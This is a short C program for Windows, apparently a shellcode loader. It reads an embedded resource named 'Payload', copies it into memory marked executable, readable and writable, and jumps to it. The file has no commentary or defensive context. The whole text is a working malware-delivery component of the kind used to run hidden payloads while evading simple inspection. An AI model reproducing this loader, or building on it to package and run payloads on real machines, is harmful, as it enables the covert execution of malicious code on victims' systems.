#include <Windows.h>
#include <stdio.h>

int main() {
    HRSRC shellcodeRes = FindResource(NULL, "Payload", "PAYLOAD");

    if (shellcodeRes == NULL) {
        fprintf(stderr, "[-] Error (FindResource): %lu", GetLastError());
        return 1;
    }

    DWORD shellcodeSz  = SizeofResource(NULL, shellcodeRes);

    if (shellcodeSz == 0) {
        fprintf(stderr, "[-] Error (SizeofResource): %lu", GetLastError());
        return 1;
    }

    HGLOBAL shellcodeRsData = LoadResource(NULL, shellcodeRes);

    if (shellcodeRsData == NULL) {
        fprintf(stderr, "[-] Error (LoadResource): %lu", GetLastError());
        return 1;
    }

    void* exec = VirtualAlloc(0, shellcodeSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (exec == NULL) {
        fprintf(stderr, "[-] Error (VirtualAlloc): %lu", GetLastError());
        return 1;
    }

    memcpy(exec, shellcodeRsData, shellcodeSz);

    ((void(*)())exec)();

    return 0;
}